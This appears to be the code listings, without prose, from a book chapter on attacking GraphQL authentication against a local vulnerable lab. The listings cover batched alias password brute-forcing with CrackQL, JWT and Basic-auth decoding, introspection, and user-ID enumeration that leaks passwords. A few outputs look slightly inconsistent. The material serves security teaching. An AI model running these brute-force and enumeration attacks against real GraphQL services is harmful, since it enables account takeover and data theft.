["```\nAuthorization: Basic `<base64_encoded_credential>`\n```", "```\nAuthorization: Basic YWRtaW46YmxhY2toYXRncmFwaHFsCg==\n```", "```\n# **echo \"YWRtaW46YmxhY2toYXRncmFwaHFsCg==\" | base64 -d**\nadmin:blackhatgraphql\n```", "```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9**.**eyJ0eXBlIjoiYWNjZXNzIiwiaWF0Ijo\nxNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIsImp0aSI6ImY0OThmZmQxLWU0YzctNGU\n5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE\n2NTY0NzEyMjJ9**.**NHs6JiLDONJsC9LpJzdBB8enXzIrqI0Cvqojj8SqA4s\n```", "```\n# **echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d**\n\n{\n  \"typ\": \"JWT\",\n  \"alg\": \"HS256\"\n}\n```", "```\n# **echo \"eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIs**\n**Imp0aSI6ImY0OThmZmQxLWU0YzctNGU5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImlkZW50aXR5Ijoi**\n**b3BlcmF0b3IiLCJleHAiOjE2NTY0NzEyMjJ9\" | base64 -d**\n{\n  \"type\": \"access\",\n  \"iat\": 1656464022,\n  \"nbf\": 1656464022,\n  \"jti\": \"f498ffd1-e4c7-4e92-9e4a-bb74bfece18f\",\n  \"identity\": \"operator\",\n  \"exp\": 1656471222\n}\n```", "```\nextend type Query {\n  me: User\n}\n\ntype Mutation {\n   login(username: String!, password: String!): User\n   signup(username: String!, password: String!): User\n}\n\nextend type User {\n  username: String!\n} \n```", "```\nconst permissions = shield({\n  Query: {\n    frontPage: not(isAuthenticated),\n    fruits: and(isAuthenticated, or(isAdmin, isEditor)),\n    customers: and(isAuthenticated, isAdmin),\n  },\n  Mutation: {\n    addFruitToBasket: isAuthenticated,\n  },\n  Fruit: isAuthenticated,\n  Customer: isAdmin,\n})\n```", "```\n# **curl -X POST http://localhost:5013/graphql -d '{\"query\":\"{ __typename }\"}'**\n**-H \"Content-Type: application/json\" -H \"X-Forwarded-For: 10.0.0.1\"**\n```", "```\n{\n  __schema {\n    mutationType {\n      name\n      kind\n      fields {\n        name\n        description\n      }\n    }\n  }\n}\n```", "```\nmutation {\n    alias1: login(username: \"admin\", password: \"admin\") {\n      accessToken\n    }\n    alias2: login(username: \"admin\", password: \"password\") {\n      accessToken\n    }\n    alias3: login(username: \"admin\", password: \"pass\") {\n      accessToken\n    }\n    alias4: login(username: \"admin\", password: \"pass123\") {\n      accessToken\n    }\n    alias5: login(username: \"admin\", password: \"password123\") {\n      accessToken\n    }\n    alias6: login(username: \"operator\", password: \"operator\") {\n      accessToken\n    }\n    alias7: login(username: \"operator\", password: \"password\") {\n      accessToken\n    }\n    alias8: login(username: \"operator\", password: \"pass\") {\n      accessToken\n    }\n alias9: login(username: \"operator\", password: \"pass123\"){\n      accessToken\n    }\n    alias10: login(username: \"operator\", password: \"password123\"){\n      accessToken\n    }\n}\n```", "```\n{\n  \"errors\": [\n    {\n      \"message\": \"Authentication Failure\",\n      \"locations\": [\n        {\n          \"line\": 2,\n          \"column\": 5\n        }\n      ],\n      \"path\": [\n        \"alias1\"\n      ]\n    },\n`--snip--`\n    {\n      \"message\": \"Authentication Failure\",\n      \"locations\": [\n        {\n          \"line\": 26,\n          \"column\": 5\n        }\n      ],\n      \"path\": [\n        \"alias9\"\n      ]\n    }\n  ],\n  \"data\": {\n    \"alias1\": null,\n`--snip--`\n    \"alias9\": null,\n    \"alias10\": {\n      \"accessToken\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzI\niwiaWF0IjoxNjU2OTcxMDc5LCJuYmYiOjE2NTY5NzEwNzksImp0aSI6IjQ3NmEwYTYxLTk0OGUtNDZmO\nS05ZDBmLTFlMzk3MDAxMTNjYiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTY5NzgyNzl9.NJ\nZOugXBwG-0oEcT2UtH-xeBFwqxS0_5Ag1Y7-L3EgI\"\n    }\n```", "```\n# **cd ~/CrackQL**\n# **python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql**\n**-i sample-inputs/usernames_and_passwords.csv --verbose**\n```", "```\nmutation {\n  login(username: {{username|str}}, password: {{password|str}}) {\n    accessToken\n   }\n}\n```", "```\nData:\n[{'alias1': {'data': None,\n             'inputs': {'password': 'admin', 'username': 'admin'}}},\n*--snip--*\n\n {'alias9': {'data': None,\n             'inputs': {'password': 'operator', 'username': 'pass123'}}},\n {'**alias10**': {'data': {'**accessToken**': '**eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU3MDQ2NjI5LCJuYmYiOjE2N**\n**TcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLThiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0**\n**b3IiLCJleHAiOjE2NTcwNTM4Mjl9.Ba3zfvSZqjDmyLFdx71WCs-7vidaxpUfs2X3UK3zZBA'**},\n              'inputs': {'password': 'password123', 'username': 'operator'}}}]\nErrors:\n[{'alias1': {'error': 'Authentication Failure',\n             'inputs': {'password': 'admin', 'username': 'admin'}}},\n {'alias2': {'error': 'Authentication Failure',\n             'inputs': {'password': 'admin', 'username': 'password'}}},\n*--snip--*\n\n {'alias9': {'error': 'Authentication Failure',\n             'inputs': {'password': 'password123', 'username': 'operator'}}}]\n[*] Writing to directory results/localhost:5013_5bab6e\n```", "```\n# **cat config.py**\n\nHEADERS = {\"Authorization\": \"Bearer mytoken\"}\nCOOKIES = {\"session:\"session-secret\"}\n```", "```\nmutation RegisterAccount {\n    register(username: \"operator\", password: \"password\"){\n        user_id\n    }\n}\n```", "```\nmutation RegisterAccount {\n    withdrawal(amount: 100.00, from: \"ACT001\", dest: \"ACT002\"){\n        confirmationCode\n    }\n}\n```", "```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.**eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNj**\n**U3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iN**\n**zRhLThiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTcwNTM4**\n**MjksImFwaV90b2tlbiI6IkFQSV9TRUNSRVRfUEFTU1dPUkQifQ**.iIQ9zMRP2bA0Yx8p7INu\nrfC-PcVz3-KqfzEE4uQICbc\n```", "```\n{\n  \"type\": \"access\",\n  \"iat\": 1657046629,\n  \"nbf\": 1657046629,\n  \"jti\": \"5d38d3f9-cc55-472c-b74a-8b7ae3124ae2\",\n  \"identity\": \"operator\",\n  \"exp\": 1657053829,\n  **\"api_token\":\"API_SECRET_PASSWORD\"**\n}\n```", "```\nquery {\n  me(token: \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0Ij\noxNjU3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLT\nhiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTcwNTM4Mjl9.Ba3zfvSZq\njDmyLFdx71WCs-7vidaxpUfs2X3UK3zZBA\"){\n    id\n    username\n    password\n  }\n}\n```", "```\n{\n  \"data\": {\n    \"me\": {\n      \"id\": \"2\",\n      \"username\": \"operator\",\n      \"password\": \"******\"\n    }\n  }\n}\n```", "```\n{\n  \"data\": {\n    \"me\": {\n      \"id\": \"1\",\n      \"username\": \"admin\",\n      \"password\": \"changeme\"\n    }\n  }\n}\n```", "```\nquery {\n  __schema {\n    directives {\n      name\n      args {\n        name\n      }\n    }\n  }\n}\n```", "```\nType User {\n  id: ID\n  username: String\n  email: String\n  password: String @auth(requires: ADMIN)\n  role: String\n}\n```", "```\ntype Query {\n  pastes(public: Boolean, limit: Int, filter: String): [**PasteObject**]\n  paste(id: Int, title: String): **PasteObject**\n`--snip--`\n  users(id: Int): [UserObject]\n  readAndBurn(id: Int): **PasteObject**\n  search(keyword: String): [SearchResult]\n  audits: [AuditObject]\n  deleteAllPastes: Boolean\n  me(token: String): UserObject\n}\n```", "```\n# **cd ~**\n# **./graphql-path-enum -i introspection.json -t PasteObject**\n\nFound 3 ways to reach the \"PasteObject\" node:\n- Query (pastes) -> PasteObject\n- Query (paste) -> PasteObject\n- Query (readAndBurn) -> PasteObject\n```", "```\nquery {\n  users(id: 1) {\n    username\n    password\n  }\n}\n```", "```\n**query {**\n **users(id: {{id|int}}) {**\n **username**\n **password**\n **}**\n**}**\n```", "```\n# **cd ~/CrackQL**\n# **echo \"id\" > sample-inputs/users.csv**\n# **for id in `seq 1 100`; do echo $id >> sample-inputs/users.csv; done**\n```", "```\n# **head -5 sample-inputs/users.csv**\n\nid\n1\n2\n3\n4\n```", "```\n# **python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/users.graphql**\n**-i sample-inputs/users.csv --verbose**\n\n[+] Verifying Payload Batch Operation...\n[+] Sending Alias Batch 1 of 1 to http://localhost:5013/graphql...\n===============================\nResults:\n\nData:\n[{'alias1': {'data': [{'password': '******', 'username': 'admin'}],\n             'inputs': {'id': '120'}}},\n {'alias2': {'data': [{'password': '******', 'username': 'operator'}],\n             'inputs': {'id': '120'}}},\n {'alias3': {'data': [], 'inputs': {'id': '120'}}},\n```", "```\nquery {\n  users(id: {{id|int}}) {\n     username\n     password\n **accessToken**\n **birthDate**\n **location**\n   }\n}\n```"]